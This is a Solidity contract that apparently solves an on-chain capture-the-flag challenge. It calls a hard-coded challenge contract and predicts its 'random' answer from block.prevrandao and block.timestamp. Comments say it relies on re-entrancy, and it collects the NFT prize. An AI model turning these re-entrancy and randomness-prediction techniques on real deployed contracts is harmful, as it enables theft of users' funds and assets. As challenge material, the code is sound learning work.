// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SRTwo is IERC721Receiver {
    address public owner;

    //this function will utilize re-entrancy to call solveChallenge when "myVal" = 1 in the challenge contract
    function go() public {
        address challengeContract = 0xf988Ebf9D801F4D3595592490D7fF029E438deCa;
        uint256 guess =
            uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
        string memory twitterHandle = "0x_Money";

        (bool success,) =
            challengeContract.call(abi.encodeWithSignature("solveChallenge(uint256,string)", guess, twitterHandle));
        success;
    }

    //initial solveChallenge caller
    function solve() public {
        owner = address(this);
        address challengeContract = 0xf988Ebf9D801F4D3595592490D7fF029E438deCa;
        uint256 guess = 1;
        string memory twitterHandle = "0x_Money";

        (bool success,) =
            challengeContract.call(abi.encodeWithSignature("solveChallenge(uint256,string)", guess, twitterHandle));
        success;
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        pure
        override
        returns (bytes4)
    {
        operator;
        from;
        tokenId;
        data;

        return (IERC721Receiver.onERC721Received.selector);
    }

    function transferNFT(address challengeNFT, address to, uint256 tokenId) external {
        IERC721(challengeNFT).safeTransferFrom(address(this), to, tokenId);
    }
}
